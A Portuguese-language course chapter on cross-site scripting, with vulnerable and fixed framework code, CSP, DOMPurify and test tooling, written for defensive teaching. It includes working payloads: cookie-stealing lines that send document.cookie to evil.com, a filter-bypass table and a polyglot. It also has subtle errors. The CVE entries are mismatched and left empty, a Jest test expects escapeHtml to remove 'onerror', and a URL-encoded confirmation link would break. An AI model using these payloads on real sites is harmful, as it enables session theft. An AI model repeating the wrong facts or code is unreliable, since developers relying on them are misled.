---
layout: default
title: "05-cross-site-scripting"
---

# Capítulo 5: Cross-Site Scripting (XSS)

> *"XSS é a vulnerabilidade web mais persistente da história — e continua matando aplicações."*

---

## Objetivos de Aprendizado

1. Diferenciar Reflected, Stored e DOM-based XSS com exemplos práticos
2. Implementar técnicas de prevenção em frameworks JavaScript modernos
3. Configurar Content Security Policy para mitigar XSS
4. Usar DOMPurify e Trusted Types para sanitização de HTML
5. Testar e auditar aplicações para vulnerabilidades XSS

---

## 5.1 O Que é XSS?

Cross-Site Scripting (XSS) ocorre quando uma aplicação web inclui conteúdo não confiável em sua resposta sem validação ou sanitização adequada. O atacante injeta scripts maliciosos que executam no contexto do navegador da vítima.

### Triângulo do XSS

```
Vítima (navegador) ← Executa script ← Servidor ← Atacante (injeta script)
```

### Impacto

| Impacto | Exemplo |
|---------|---------|
| Session hijacking | Roubo de cookie de sessão |
| Credential theft | Phishing via formulário injetado |
| Defacement | Modificação visual da página |
| Keylogging | Captura de teclado do usuário |
| Cryptocurrency mining | Mineração via script injetado |
| Worm propagation | Ataque que se auto-replica |

---

## 5.2 Tipos de XSS

### 5.2.1 Reflected XSS

O payload está na URL ou em um parâmetro de request que é refletido na resposta:

```
https://exemplo.com/search?q=<script>alert('XSS')</script>
```

```javascript
// VULNERÁVEL (Express.js)
app.get('/search', (req, res) => {
    res.send(`<h1>Resultados para: ${req.query.q}</h1>`);
});

// CORRETO
const escapeHtml = require('escape-html');
app.get('/search', (req, res) => {
    res.send(`<h1>Resultados para: ${escapeHtml(req.query.q)}</h1>`);
});
```

### 5.2.2 Stored XSS

O payload é armazenado no banco de dados e entregue a outros usuários:

```python
# VULNERÁVEL (Flask)
@app.route('/comment', methods=['POST'])
def add_comment():
    comment = request.form['comment']
    db.execute("INSERT INTO comments (body) VALUES (?)", [comment])
    return redirect('/comments')

# No template (Jinja2 sem autoescape):
@app.route('/comments')
def show_comments():
    comments = db.execute("SELECT * FROM comments").fetchall()
    return render_template('comments.html', comments=comments, autoescape=False)  # PERIGOSO
```

```html
<!-- comments.html VULNERÁVEL -->
{% for comment in comments %}
<div class="comment">{{ comment.body | safe }}</div>  <!-- XSS! -->
{% endfor %}

<!-- comments.html SEGURO -->
{% for comment in comments %}
<div class="comment">{{ comment.body }}</div>  <!-- autoescape ON por padrão -->
{% endfor %}
```

### 5.2.3 DOM-based XSS

O payload é processado inteiramente no lado do cliente:

```javascript
// VULNERÁVEL — DOM XSS
const name = new URLSearchParams(window.location.search).get('name');
document.getElementById('output').innerHTML = `Olá, ${name}!`;
// URL: ?name=<img src=x onerror=alert(1)>

// CORRETO
const name = new URLSearchParams(window.location.search).get('name');
document.getElementById('output').textContent = `Olá, ${name}!`;
// textContent não interpreta HTML
```

**Sinks perigosos no DOM:**

| Sink | Risco | Alternativa |
|------|-------|-------------|
| `innerHTML` | Alto | `textContent` |
| `outerHTML` | Alto | `textContent` |
| `document.write()` | Alto | `createElement` + `appendChild` |
| `eval()` | Crítico | N/A — nunca usar |
| `setTimeout(string)` | Alto | `setTimeout(function)` |
| `setInterval(string)` | Alto | `setInterval(function)` |
| `new Function(string)` | Alto | Nunca |
| `$.html()` (jQuery) | Alto | `.text()` |

### 5.2.4 Mutation XSS (mXSS)

Acontece quando o navegador reescreve o DOM de forma inesperada:

```javascript
// Mutation XSS: payload muda após inserção
const payload = '<noscript><p title="</noscript><img src=x onerror=alert(1)>">';
element.innerHTML = payload;
// O navegador reescreve o DOM, expondo o onerror
```

---

## 5.3 Vetores de Ataque

### 5.3.1 Via Parâmetros de URL

```
https://app.com/page?title=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
```

### 5.3.2 Via Formulários

```html
<!-- Formulário com campo que aceita HTML -->
<form action="/profile" method="POST">
    <input name="bio" value="<script>alert(1)</script>">
    <button type="submit">Salvar</button>
</form>
```

### 5.3.3 Via HTTP Headers

```
Referer: https://evil.com/<script>alert(1)</script>
User-Agent: <script>alert(1)</script>
```

### 5.3.4 Via URL Fragments

```
https://app.com/#<img src=x onerror=alert(1)>
```

### 5.3.5 Via Upload de Arquivos

```javascript
// Upload de SVG com script embutido
const maliciousSVG = `<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
    <text x="10" y="20">XSS via SVG</text>
</svg>`;
```

---

## 5.4 XSS em Frameworks Modernos

### 5.4.1 React

{% raw %}
```jsx
// VULNERÁVEL — dangerouslySetInnerHTML
function Comment({ text }) {
    return <div dangerouslySetInnerHTML={{ __html: text }} />;  // XSS!
}

// SEGURO — React auto-escapes por padrão
function Comment({ text }) {
    return <div>{text}</div>;  // Seguro — escape automático
}

// VULNERÁVEL — href com javascript:
function Link({ url }) {
    return <a href={url}>Click</a>;  // url = "javascript:alert(1)"
}

// SEGURO — validação de URL
function Link({ url }) {
    const isSafe = url.startsWith('https://');
    return <a href={isSafe ? url : '#'}>Click</a>;
}
```
{% endraw %}

### 5.4.2 Vue.js

```vue
<!-- VULNERÁVEL — v-html -->
<div v-html="userContent"></div>

<!-- SEGURO — interpolação padrão -->
<div>{{ userContent }}</div>

<!-- SEGURO — sanitização antes de v-html -->
<script>
import DOMPurify from 'dompurify';

export default {
    computed: {
        safeContent() {
            return DOMPurify.sanitize(this.userContent);
        }
    }
}
</script>
```

### 5.4.3 Angular

```typescript
// VULNERÁVEL — bypassSecurityTrust
@Component({
    template: `<div [innerHTML]="trustedContent"></div>`
})
export class UnsafeComponent {
    trustedContent = this.sanitizer.bypassSecurityTrustHtml('<img src=x onerror=alert(1)>');
}

// SEGURO — Angular auto-sanitiza por padrão
@Component({
    template: `<div [innerHTML]="userContent"></div>`  // Sanitizado automaticamente
})
export class SafeComponent {
    userContent = '<b>Texto seguro</b>';  // Script tags removidos
}
```

---

## 5.5 Prevenção

### 5.5.1 Content Security Policy (CSP)

```
Content-Security-Policy: 
    default-src 'self';
    script-src 'self' 'nonce-abc123';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    font-src 'self';
    connect-src 'self' https://api.exemplo.com;
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
```

### 5.5.2 DOMPurify

```javascript
import DOMPurify from 'dompurify';

// Configuração padrão — segura
const clean = DOMPurify.sanitize(dirty);

// Configuração para Markdown
const clean = DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href', 'title'],
    ALLOW_DATA_ATTR: false
});

// Configuração para rich text editor
const clean = DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: ['p', 'br', 'b', 'i', 'u', 'em', 'strong', 'a', 'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'blockquote', 'code', 'pre'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
    ALLOW_DATA_ATTR: false
});
```

### 5.5.3 Output Encoding

| Contexto | Encoding | Exemplo |
|----------|----------|---------|
| HTML Body | HTML entity encoding | `<` → `&lt;` |
| HTML Attribute | Attribute encoding | `"` → `&quot;` |
| JavaScript | JS encoding | `'` → `\x27` |
| URL | URL encoding | ` ` → `%20` |
| CSS | CSS encoding | `\3C` para `<` |

```javascript
// Funções de encoding
function escapeHtml(str) {
    const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;' };
    return str.replace(/[&<>"']/g, c => map[c]);
}

function escapeAttribute(str) {
    return str.replace(/[^a-zA-Z0-9,.\-_]/g, c => '&#' + c.charCodeAt(0) + ';');
}

function escapeJs(str) {
    return str.replace(/['"\\]/g, c => '\\' + c);
}
```

### 5.5.4 Trusted Types API

```javascript
// Habilitar Trusted Types
if (window.trustedTypes && trustedTypes.createPolicy) {
    const policy = trustedTypes.createPolicy('default', {
        createHTML: (str) => DOMPurify.sanitize(str),
        createScriptURL: (str) => {
            const url = new URL(str, document.baseURI);
            if (url.origin !== window.location.origin) throw new Error('Cross-origin blocked');
            return url;
        },
        createScript: (str) => {
            throw new Error('Inline scripts blocked by Trusted Types');
        }
    });
}

// Agora, qualquer tentativa de usar innerHTML passa pelo policy
element.innerHTML = untrustedString;  // Automaticamente sanitizado
```

---

## 5.6 Técnicas de Bypass e Evasão

### 5.6.1 Filtros Comuns e Evasão

| Filtro | Payload de Bypass |
|--------|-------------------|
| `<script>` removido | `<img src=x onerror=alert(1)>` |
| `onerror` removido | `<svg onload=alert(1)>` |
| `alert` removido | `<script>confirm(1)</script>` |
| `javascript:` removido | `<a href="java&#x73;cript:alert(1)">` |
| Espaços removidos | `<img/src=x/onerror=alert(1)>` |
| Aspas removidas | `<script>document.location=`http://evil.com/`+document.cookie</script>` |

### 5.6.2 Polyglots

```javascript
// Polyglot XSS — funciona em múltiplos contextos
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>
```

---

## 5.7 Casos Reais

### CVE-2019-11091: Microsoft Edge XSS

### CVE-2020-1598: Chromium V8 XSS

### Stored XSS em Redes Sociais (caso genérico)

Um XSS armazenado em um campo de perfil pode:
1. Roubar sessões de todos os seguidores
2. Auto-replicar (worm XSS)
3. Minerar criptomoedas nos navegadores das vítimas
4. Redirecionar para phishing

---

## 5.8 Testes de XSS

### 5.8.1 Payloads de Teste

```javascript
// Testes básicos
'<script>alert(document.domain)</script>'
'<img src=x onerror=alert(1)>'
'<svg onload=alert(1)>'
'<body onload=alert(1)>'
'<iframe src="javascript:alert(1)">'

// Testes de context
'"-alert(1)-"'
"'><script>alert(1)</script>"
"javascript:alert(1)"
```

### 5.8.2 Ferramentas

| Ferramenta | Tipo | Uso |
|------------|------|-----|
| XSS Hunter | Stored XSS | Monitoramento de payloads |
| Dalfox | Scanner | XSS automated detection |
| Burp Suite | Proxy | Manual testing |
| OWASP ZAP | Scanner | Automated + manual |
| TruffleHog | SAST | Code-level detection |

---

## 5.9 Exercícios

### Exercício 1: Identificar XSS
Encontre e explique 3 vulnerabilidades XSS em um aplicativo web de exemplo.

### Exercício 2: CSP Configuration
Configure CSP para um blog que aceita comentários com formatação básica (bold, italic, links).

### Exercício 3: DOMPurify Custom
Crie uma configuração DOMPurify que aceite Markdown renderizado mas bloqueie todos os event handlers.

### Exercício 4: Framework Security
Escreva um componente React que renderize HTML do usuário de forma segura, suportando imagens e links.

### Exercício 5: Pen Test
Use Burp Suite ou OWASP ZAP para testar XSS em uma aplicação de exemplo (DVWA ou Juice Shop).

---

## 5.10 Referências

1. OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html
2. OWASP DOM based XSS Prevention: https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
3. DOMPurify: https://github.com/cure53/DOMPurify
4. Trusted Types: https://web.dev/trusted-types/
5. Content Security Policy: https://content-security-policy.com/
6. PortSwigger XSS: https://portswigger.net/web-security/cross-site-scripting
7. Mozilla Security Headers: https://infosec.mozilla.org/guidelines/web_security
8. Google CSP Evaluator: https://csp-evaluator.withgoogle.com/
9. XSS Game (Google): https://xss-game.appspot.com/
10. SecLists XSS Payloads: https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/XSS

---

*[Capítulo anterior: 04 — SQL Injection](04-sql-injection.md)*
*[Próximo capítulo: 06 — CSRF e Clickjacking](06-csrf-clickjacking.md)*

---

## 5.10 XSS em Single Page Applications (SPAs)

### 5.10.1 React — Padrões Avançados de Segurança

{% raw %}
```jsx
// Componente seguro para renderizar HTML do usuário
import DOMPurify from 'dompurify';
import { useMemo } from 'react';

function SafeHTML({ html, allowedTags }) {
    const cleanHTML = useMemo(() => {
        return DOMPurify.sanitize(html, {
            ALLOWED_TAGS: allowedTags || ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
            ALLOWED_ATTR: ['href', 'title', 'target', 'rel'],
            ALLOW_DATA_ATTR: false
        });
    }, [html, allowedTags]);
    
    return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
}

// Hook para sanitização
function useSanitizedHTML(dirtyHTML, config = {}) {
    return useMemo(() => {
        if (!dirtyHTML) return '';
        return DOMPurify.sanitize(dirtyHTML, {
            ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
            ALLOW_DATA_ATTR: false,
            ...config
        });
    }, [dirtyHTML]);
}
```
{% endraw %}

### 5.10.2 Vue.js — Directive Customizada

```vue
<!-- v-safe-html.js — Diretiva customizada segura -->
import DOMPurify from 'dompurify';

export const safeHtml = {
    mounted(el, binding) {
        el.innerHTML = DOMPurify.sanitize(binding.value, {
            ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
            ALLOW_DATA_ATTR: false
        });
    },
    updated(el, binding) {
        el.innerHTML = DOMPurify.sanitize(binding.value, {
            ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li'],
            ALLOW_DATA_ATTR: false
        });
    }
};

// Uso:
// <div v-safe-html="userContent"></div>
```

### 5.10.3 Angular — Safe Pipe

```typescript
// safe.pipe.ts
import { Pipe, PipeTransform } from '@angular/core';
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';
import DOMPurify from 'dompurify';

@Pipe({ name: 'safeHtml' })
export class SafeHtmlPipe implements PipeTransform {
    constructor(private sanitizer: DomSanitizer) {}
    
    transform(value: string): SafeHtml {
        const clean = DOMPurify.sanitize(value, {
            ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
            ALLOW_DATA_ATTR: false
        });
        return this.sanitizer.bypassSecurityTrustHtml(clean);
    }
}

// Uso no template:
// <div [innerHTML]="userContent | safeHtml"></div>
```

---

## 5.11 XSS em Markdown Rendering

### 5.11.1 Ataques Via Markdown

```markdown
# Markdown com XSS embutido

[Click aqui](javascript:alert(document.cookie))

![Imagem](x onerror=alert(1))

<script>alert('XSS via markdown')</script>

[Link normal](data:text/html,<script>alert(1)</script>)
```

### 5.11.2 Renderizadores Seguros

```javascript
// marked.js com sanitização
import { marked } from 'marked';
import DOMPurify from 'dompurify';

// Configurar marked para nao aceitar HTML
marked.setOptions({
    sanitize: true,
    headerIds: false,
    mangle: false
});

function renderMarkdownSafe(markdown) {
    const rawHTML = marked.parse(markdown);
    return DOMPurify.sanitize(rawHTML, {
        ALLOWED_TAGS: ['h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'p', 'br', 'hr',
                       'ul', 'ol', 'li', 'blockquote', 'pre', 'code', 'em', 'strong',
                       'a', 'img', 'table', 'thead', 'tbody', 'tr', 'th', 'td'],
        ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class', 'id', 'start', 'align', 'valign', 'colspan', 'rowspan', 'width', 'height'],
        ALLOW_DATA_ATTR: false
    });
}
```

---

## 5.12 XSS em Rich Text Editors

### 5.12.1 TipTap / ProseMirror (Projetos 2024+)

```javascript
import { Editor } from '@tiptap/core';
import StarterKit from '@tiptap/starter-kit';
import DOMPurify from 'dompurify';

const editor = new Editor({
    element: document.getElementById('editor'),
    extensions: [StarterKit],
    content: '',
    onUpdate: ({ editor }) => {
        const html = editor.getHTML();
        const clean = DOMPurify.sanitize(html, {
            ALLOWED_TAGS: ['p', 'br', 'b', 'i', 'u', 'em', 'strong', 'a', 'ul', 'ol', 'li',
                          'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'blockquote', 'code', 'pre',
                          'hr', 'table', 'thead', 'tbody', 'tr', 'th', 'td', 'img'],
            ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'target', 'rel', 'width', 'height',
                          'class', 'id', 'colspan', 'rowspan', 'align', 'valign', 'start', 'open'],
            ALLOW_DATA_ATTR: false,
            ALLOW_UNKNOWN_PROTOCOLS: false
        });
        
        // Enviar clean para o servidor
        fetch('/api/comments', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: clean })
        });
    }
});
```

### 5.12.2 CKEditor — Configuração Segura

```javascript
import ClassicEditor from '@ckeditor/ckeditor5-build-classic';

ClassicEditor
    .create(document.querySelector('#editor'), {
        toolbar: {
            items: [
                'heading', '|', 'bold', 'italic', 'link', 'bulletedList', 'numberedList',
                '|', 'outdent', 'indent', '|', 'blockQuote', 'insertTable',
                '|', 'undo', 'redo'
            ]
        },
        // Restringir plugins perigosos
        removePlugins: ['MediaEmbed', 'HtmlEmbed', 'Iframe'],
        // Configurar allowedContent
        allowedContent: 'p b i u em strong a[href|target|rel] ul ol li h1 h2 h3 h4 h5 h6 blockquote pre code table thead tbody tr th td img[src|alt|title|width|height] br hr',
        // Configurar link para abrir em nova aba com rel=noopener
        link: {
            addTargetToExternalLinks: true,
            defaultProtocol: 'https://'
        }
    })
    .catch(error => {
        console.error('Erro ao inicializar editor:', error);
    });
```

---

## 5.13 XSS em Email Templates

### 5.13.1 Template Injection em Email

```javascript
// VULNERÁVEL — email com template injection
const sendWelcomeEmail = (user) => {
    const template = `
        <h1>Bem-vindo, ${user.name}!</h1>
        <p>Sua conta foi criada com sucesso.</p>
        <p>Para confirmar, clique em: <a href="${user.confirmationUrl}">Confirmar</a></p>
    `;
    // Se user.name contiver <script> ou <img onerror>, XSS no email
    mailer.send({ to: user.email, html: template });
};

// SEGURO — sanitização e encoding
const sanitizeEmailHTML = (dirty) => {
    return DOMPurify.sanitize(dirty, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'h1', 'h2', 'h3'],
        ALLOWED_ATTR: ['href', 'title', 'target', 'rel']
    });
};

const sendWelcomeEmail = (user) => {
    const template = `
        <h1>Bem-vindo, ${sanitizeEmailHTML(user.name)}!</h1>
        <p>Sua conta foi criada com sucesso.</p>
        <p>Para confirmar, clique em: <a href="${encodeURIComponent(user.confirmationUrl)}">Confirmar</a></p>
    `;
    mailer.send({ to: user.email, html: template });
};
```

---

## 5.14 Testes Automatizados de XSS

### 5.14.1 Puppeteer — Teste Automatizado

```javascript
const puppeteer = require('puppeteer');

async function testXSS(url, payload) {
    const browser = await puppeteer.launch();
    const page = await browser.newPage();
    
    // Intercept alert dialogs
    let alertTriggered = false;
    page.on('dialog', async dialog => {
        alertTriggered = true;
        await dialog.dismiss();
    });
    
    // Navigate to URL with payload
    await page.goto(`${url}?q=${encodeURIComponent(payload)}`, {
        waitUntil: 'networkidle0'
    });
    
    // Check if XSS was triggered
    const result = {
        payload,
        triggered: alertTriggered,
        url: page.url(),
        html: await page.content()
    };
    
    await browser.close();
    return result;
}

// Testes de XSS
const payloads = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '"><script>alert(1)</script>',
    "';alert(1)//",
    '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">'
];

(async () => {
    for (const payload of payloads) {
        const result = await testXSS('http://localhost:3000/search', payload);
        console.log(`${result.triggered ? 'VULNERÁVEL' : 'SEGURO'}: ${payload.substring(0, 50)}`);
    }
})();
```

### 5.14.2 Jest — Testes Unitários

```javascript
describe('XSS Prevention', () => {
    test('escapeHtml prevents script injection', () => {
        const input = '<script>alert("XSS")</script>';
        const output = escapeHtml(input);
        expect(output).not.toContain('<script>');
        expect(output).toContain('&lt;script&gt;');
    });
    
    test('escapeHtml prevents img onerror', () => {
        const input = '<img src=x onerror=alert(1)>';
        const output = escapeHtml(input);
        expect(output).not.toContain('onerror');
    });
    
    test('DOMPurify removes script tags', () => {
        const input = '<b>safe</b><script>alert(1)</script>';
        const output = DOMPurify.sanitize(input);
        expect(output).toBe('<b>safe</b>');
        expect(output).not.toContain('script');
    });
    
    test('DOMPurify preserves allowed tags', () => {
        const input = '<b>bold</b> and <i>italic</i>';
        const output = DOMPurify.sanitize(input);
        expect(output).toContain('<b>bold</b>');
        expect(output).toContain('<i>italic</i>');
    });
    
    test('DOMPurify removes event handlers', () => {
        const input = '<div onmouseover="alert(1)">hover me</div>';
        const output = DOMPurify.sanitize(input);
        expect(output).not.toContain('onmouseover');
    });
    
    test('XSS via URL fragment is blocked', () => {
        const fragment = '#<script>alert(1)</script>';
        const sanitized = escapeHtml(decodeURIComponent(fragment));
        expect(sanitized).not.toContain('<script>');
    });
});
```

---

## 5.15 Defesa em Profundidade

### 5.15.1 Checklist de Prevenção XSS

| Camada | Medida | Prioridade |
|--------|--------|-----------|
| Output encoding | HTML entity encoding | Crítico |
| CSP | Content-Security-Policy header | Crítico |
| Sanitization | DOMPurify / sanitize-html | Alto |
| Framework | Auto-escaping habilitado | Alto |
| Input validation | Allowlist de caracteres | Médio |
| Trusted Types | Browser API para DOM security | Médio |
| SRI | Subresource Integrity para CDN | Médio |
| HTTPOnly cookies | Previne roubo via XSS | Alto |
| SameSite cookies | Previne CSRF via XSS | Alto |
| Security headers | X-Content-Type-Options, etc. | Médio |

### 5.15.2 Arquitetura de Segurança Contra XSS

```
Input → Validation (allowlist) → Sanitization (DOMPurify) → 
Encoding (context-specific) → CSP (browser enforcement) → 
Trusted Types (DOM sink protection) → Output to user
```

Cada camada é uma defesa independente. Se uma falha, a próxima protege.

---

## 5.16 Referências Adicionais

11. OWASP XSS Filter Evasion Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
12. PortSwigger XSS Labs: https://portswigger.net/web-security/cross-site-scripting/working-with-contexts
13. MDN Web Security — XSS: https://developer.mozilla.org/en-US/docs/Web/Security
14. CSP Level 3 Specification: https://www.w3.org/TR/CSP3/
15. Trusted Types Spec: https://w3c.github.io/trusted-types/dist/spec/
16. DOMPurify Source: https://github.com/cure53/DOMPurify
17. sanitize-html: https://github.com/apostrophecms/sanitize-html
18. Google XSS Game Solutions: https://github.com/nicjansma/xss-game-solutions
19. OWASP ASVS v4.0 — Verification Requirements for XSS: https://asvs.owasp.org/
20. CWE-79: Improper Neutralization of Input During Web Page Generation: https://cwe.mitre.org/data/definitions/79.html
21. CWE-116: Improper Encoding or Escaping of Output: https://cwe.mitre.org/data/definitions/116.html
